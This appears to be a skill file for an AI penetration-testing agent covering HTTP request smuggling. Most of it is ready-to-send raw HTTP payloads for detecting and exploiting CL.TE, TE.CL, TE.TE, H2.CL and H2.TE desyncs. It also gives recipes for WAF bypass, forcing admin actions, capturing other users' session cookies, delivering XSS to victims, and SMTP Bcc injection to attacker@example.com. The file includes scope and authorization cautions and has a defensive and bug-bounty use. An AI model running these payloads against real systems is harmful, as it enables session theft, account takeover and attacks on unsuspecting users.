---
name: request-smuggling
description: HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, H2.CL, H2.TE). Use when HauntMode flags this category as APPLIES/MAYBE, when the target sits behind a reverse proxy or WAF, or when you need end-to-end detection and exploitation methodology including access-control bypass, victim request capture, and XSS delivery.
---

# Request Smuggling — HTTP Desync Attacks

This skill covers all variants of HTTP request smuggling: CL.TE, TE.CL, TE.TE (obfuscated), H2.CL, H2.TE (downgrade), and advanced H2 header/pseudo-header injection. Read top to bottom on first use; jump to the variant section once you know what you're dealing with.

---

## 1. Triggers — when this skill applies

- Target has a visible reverse proxy, CDN, load balancer, or WAF in front of the web server
- `Server:` header shows one technology (e.g. ATS, nginx, Cloudflare) but error pages reveal a different backend (gunicorn, Apache, IIS)
- `Connection: keep-alive` present on a POST endpoint
- HTTP/2 is in use but backend may be HTTP/1.1 (common with Nginx/Cloudflare fronting a Python/PHP backend)
- Admin-only paths are blocked by a WAF header rule (keyword in URL blocked)
- There is a POST endpoint with both `Content-Length` and `Transfer-Encoding` headers accepted
- Any response timing anomaly when both CL and TE headers are present

---

---

## 3. 30-second triage

Send this probe twice quickly in Burp Repeater (same tab, send twice in succession):

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

- Second response returns HTTP 405 or "Invalid HTTP method"? → CL.TE confirmed (reverse proxy used CL, backend used TE, `HELLO` was prepended to next request)
- Second response returns HTTP 400 "Invalid HTTP request line: 'HELLO'"? → TE.CL confirmed (reverse proxy used TE, backend used CL)
- Neither? Try TE.TE obfuscation methods (see section 5)

**Burp Community note:** No active scanner. All detection is manual via Repeater. Use tab groups + "Send group in sequence (single connection)" for TE.CL testing. Uncheck "Update Content-Length" in Repeater settings for TE.CL payloads — Burp auto-updating CL will break them.

---

## 4. Background — why this works

HTTP/1.1 multiplexes requests over a single TCP connection. Two headers define where one request ends: `Content-Length` (CL) — byte count of body; `Transfer-Encoding: chunked` (TE) — chunked body terminated by `0\r\n\r\n`. RFC says if both present, TE wins. When the front-end and back-end disagree on which header to use, an attacker can leave bytes in the TCP stream that the backend treats as the beginning of the next request.

---

## 5. Detection by variant

### 5.1 CL.TE (front-end uses CL, back-end uses TE)

Front-end does not support chunked encoding and falls back to CL. Back-end correctly uses TE.

Detection probe (send twice rapidly):

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

- CL=10 → front-end sees body as `0\r\n\r\nHELLO` (10 bytes), forwards all to backend
- Backend sees empty chunk `0\r\n\r\n`, terminates request. `HELLO` is left for next request
- Second request gets `HELLOGET / HTTP/1.1...` → HTTP 405

### 5.2 TE.CL (front-end uses TE, back-end uses CL)

Front-end uses chunked encoding. Back-end incorrectly ignores TE and uses CL.

Detection probe (use tab group, single connection, uncheck Update Content-Length):

Tab 1:
```
GET /404 HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5
HELLO
0

```

Tab 2:
```
GET /404 HTTP/1.1
Host: TARGET
```

Send in sequence (single connection). If Tab 2 returns 400 "Invalid HTTP request line: 'HELLO'" → TE.CL confirmed.

Explanation: CL=4 → backend reads only `5\r\n` (4 bytes), leaves `HELLO\r\n0\r\n\r\n` for next request.

### 5.3 TE.TE (both use TE, obfuscate to degrade one)

Both systems support TE, but one can be tricked into ignoring it with a malformed TE header, causing it to fall back to CL — producing a CL.TE or TE.CL scenario.

Obfuscation methods to try (change one at a time in Hex view in Burp):

| Method | Header value |
|---|---|
| Substring match | `Transfer-Encoding: xchunked` |
| Space before colon | `Transfer-Encoding : chunked` |
| Horizontal tab (0x09) | `Transfer-Encoding:[\x09]chunked` |
| Vertical tab (0x0B) | `Transfer-Encoding:[\x0b]chunked` |
| Leading space | ` Transfer-Encoding: chunked` |

In Burp Hex view: find the space (0x20) after the colon in `Transfer-Encoding: ` and replace with 0x09 (horizontal tab) or 0x0B (vertical tab). After obfuscating, run the CL.TE detection probe and check for 405 on the second request.

### 5.4 H2.CL (HTTP/2 with injected Content-Length)

Applies when the front-end accepts HTTP/2 but downgrades to HTTP/1.1 for the backend. Inject a `content-length: 0` header in an HTTP/2 request with a body containing the smuggled request.

In Burp Repeater, switch to HTTP/2 (right-click > Change request version). Uncheck Update Content-Length.

```
POST /index.php HTTP/2
Host: TARGET
content-length: 0

GET /admin?reveal_flag=1 HTTP/1.1
Foo: 
```

The front-end (proxy) sees one HTTP/2 POST. The backend sees CL=0, treats everything after the headers as a new request.

### 5.5 H2.TE (HTTP/2 with injected Transfer-Encoding)

HTTP/2 RFC forbids chunked encoding, so if the proxy accepts a TE header anyway and passes it through:

```
POST / HTTP/2
Host: TARGET
transfer-encoding: chunked

0

GET /smuggled HTTP/1.1
Host: TARGET
```

### 5.6 H2 Header/Name Injection (CRLF in HTTP/2 headers)

If the reverse proxy does not validate CRLF in HTTP/2 header values or names, inject TE via a dummy header's value:

Header name: `dummy`
Header value: `asd\r\nTransfer-Encoding: chunked`

(In Burp HTTP/2 header editor, type the literal CRLF or use the Inspector to set raw bytes.)

The proxy rewrites to HTTP/1.1, splitting on CRLF, creating a real `Transfer-Encoding: chunked` header in the forwarded request.

Also try injecting via `:method` pseudo-header:
`:method` value: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd`

---

## 6. Exploitation

### 6.1 Bypass WAF/access controls

Smuggle a request to a blocked path into the body of a legitimate request:

CL.TE variant — smuggle to `/admin`:
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 64
Transfer-Encoding: chunked

0

POST /internal/index.php HTTP/1.1
Host: localhost
Dummy: 
```

TE.CL variant (Tab 1 + Tab 2 in sequence):

Tab 1:
```
GET /404 HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: TARGET

0

```

Tab 2:
```
GET /404 HTTP/1.1
Host: TARGET
```

CL=4 → backend sees only `27\r\n` as first request body, then `GET /admin` becomes a separate request. WAF only saw GET /404 twice.

### 6.2 Force admin to perform actions (CL.TE)

Craft the smuggled request to target an admin-only endpoint using the victim's session cookie (which the admin naturally sends with their next request):

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
```

The `Dummy:` header on the last line is critical — it absorbs the first line of the victim's subsequent request (their `GET / HTTP/1.1`) as a header value, preserving request syntax. Wait ~10 seconds for the admin's next request to hit the server.

### 6.3 Capture victim's request (session theft)

Use CL.TE to redirect a victim's request body into a comment/storage endpoint. Set `Content-Length` in the smuggled request high enough to capture the victim's full request including their `Cookie:` header.

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

name=hacker&comment=test
```

When the victim's next request arrives, it gets appended to the `comment` parameter. Check the comment section for their Cookie header. Then use that cookie to access admin areas.

Tuning `Content-Length` in the smuggled request:
- Too small: you won't capture the full Cookie header
- Too large: server times out waiting for the rest of the body — adjust by ~50 bytes at a time

### 6.4 Mass-exploit reflected XSS via smuggling

If a header like `Vuln` reflects XSS but you can't force a victim to send it, use CL.TE to prepend it to their request:

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Vuln: "><script>alert(1)</script>
Dummy: 
```

The victim's next GET request gets the `Vuln` header prepended — reflected XSS fires for them.

### 6.5 SMTP injection via request smuggling (from notes)

For targets with contact forms, smuggle a POST to the contact endpoint with an SMTP header injection:

```
POST /contact HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

0

POST /contact HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

name=victim
Bcc: attacker@example.com
Dummy: &email=victim@target.com&message=test
```

### 6.6 H2.CL — bypass WAF blocking param

```
POST /index.php HTTP/2
Host: TARGET
content-length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo: 
```

Use tab group (single connection). Tab 1 sends this, Tab 2 sends a plain `GET /`. The response to Tab 2 will contain the smuggled request's response.

---

## 7. Bypass techniques

### TE.TE obfuscation that actually worked in lab
- Vertical tab (0x0B): In Burp Hex view, find `Transfer-Encoding:` colon, change the space (0x20) after the colon to 0x0B
- Substring match: `Transfer-Encoding: xchunked` — if the WAF/proxy checks for the substring `chunked`, this still passes
- The specific method that works varies by proxy — try all five methods from section 5.3

### Chunked encoding size calculation
The chunk size must be the exact byte count of the chunk data (not including the size line itself or the trailing `\r\n`). Off-by-one breaks everything. Count carefully:
```
GET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n  = 39 bytes = 0x27
```

### Dealing with multiple backend workers
The attack is timing-dependent. Multiple worker processes mean the smuggled prefix may go to a different worker than the victim's request. Send the smuggling request repeatedly (~1/second) until it works.

### Hiding the smuggled request line in a dummy header
The first line of the victim's appended request (e.g., `GET / HTTP/1.1`) must be "swallowed" as a header value to keep valid syntax. Always end your smuggled request headers with `Dummy: ` (note the trailing space — the victim's first line becomes the value of this header).

---

## 8. False-positive checks

Do not report without confirming:

- **405 on second request alone is not enough** — verify the first request also returns a normal response. Both should be consistent.
- **Timing can cause false positives** — if the app occasionally returns 405 naturally, run the probe 3-4 times and confirm the 405 only appears on the second request after the probe, not randomly.
- **Proxy stripping TE header** — some proxies strip `Transfer-Encoding` before forwarding. If neither CL.TE nor TE.CL produces a 405, confirm with a TE.TE obfuscation attempt before concluding not vulnerable.
- **HTTP/2 only sites** — if the front-end forces HTTP/2 and you can't send HTTP/1.1 directly to it, CL.TE/TE.CL do not apply. Test H2.CL/H2.TE instead.
- **False negative on Burp Community** — without the Pro scanner, some subtle timing-based variants may be missed. Manual probing is required.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Smuggle to admin endpoint → bypass IP/WAF restriction | `auth-bypass` | Access admin panel without being on allowlist |
| Capture victim's session cookie via comment/storage endpoint | `xss`, `session-hijacking` | Full account takeover |
| Mass-deliver reflected XSS via smuggled header | `xss` | Exploitable reflected XSS even in unexploitable header context |
| Smuggle SMTP injection into contact form | `crlf` | Email injection / spam relay |
| H2.CL bypass of WAF parameter block | `cache-poisoning` | Combine with cache poisoning to persist attack |
| TE.CL + internal endpoint access | `ssrf` | Access internal-only admin paths |

---

## 10. Reporting template

```
POTENTIAL FINDING: HTTP Request Smuggling — <CL.TE | TE.CL | TE.TE | H2.CL | H2.TE>
Target: <full URL of the smuggling endpoint>
Proxy/Backend: <inferred front-end tech> / <inferred back-end tech>
Evidence:
    Detection: second request returned HTTP <405|400> after probe — confirmed desync
    Exploitation: <what was achieved: WAF bypass / session capture / XSS delivery>
    Proof: <response excerpt, session cookie stolen, admin action performed>
Smuggling payload:
    <exact two-request sequence that confirmed the vulnerability>
Impact:
    <e.g. "WAF bypass allowing access to /admin.php" or
     "Admin session cookie captured and used to log in as admin" or
     "Reflected XSS now exploitable against arbitrary victims without user crafted link">
Constraints: Burp Community — no active scanner. Manual detection only. May require timing.
Next step: <e.g. "Develop session capture payload for /profile.php endpoint",
            "Confirm admin cookie can be used to access /admin", "Submit to program">
```

---

## 11. Recon tracker vector strings

**Only log if explicitly authorized.** Suggested tags:

- `smuggling:clte:<path>` — CL.TE confirmed at endpoint
- `smuggling:tecl:<path>` — TE.CL confirmed at endpoint
- `smuggling:tete:<path>:<obfuscation-method>` — TE.TE via named obfuscation
- `smuggling:h2cl:<path>` — H2.CL confirmed
- `smuggling:h2te:<path>` — H2.TE confirmed
- `smuggling:waf-bypass:<blocked-path>` — WAF bypassed to access protected path
- `smuggling:session-capture` — captured victim session via smuggled comment
- `smuggling:xss-delivery` — delivered otherwise-unexploitable XSS via smuggling
- `smuggling:no:<path>` — not vulnerable after exhaustive testing

---

## 12. What NOT to do

- **Do not send smuggling probes at high volume** — each probe risks interfering with real users' requests. Send slowly and deliberately.
- **Do not leave smuggled prefixes queued** — if you confirm CL.TE and stop testing, the smuggled prefix sits waiting for the next victim's request. Send a clean follow-up request to flush it.
- **Do not use Update Content-Length in Burp for TE.CL payloads** — it will rewrite your carefully crafted CL value and break the attack. Uncheck it every time.
- **Do not test on out-of-scope domains** — re-read `scope.txt` first.
- **Do not auto-log to recon tracker** without explicit user instruction.
- **Do not combine with destructive payloads on production** — prove access, do not exploit beyond PoC (e.g., do not actually capture real user sessions beyond a test account, do not perform mass spam via SMTP injection).
- **Do not use Burp Active Scanner** — Community edition, no scanner. Manual only.
- **Do not forget the `Dummy:` terminator** — forgetting it will corrupt the victim's request and may cause visible errors to real users, which is noisy and potentially disruptive.
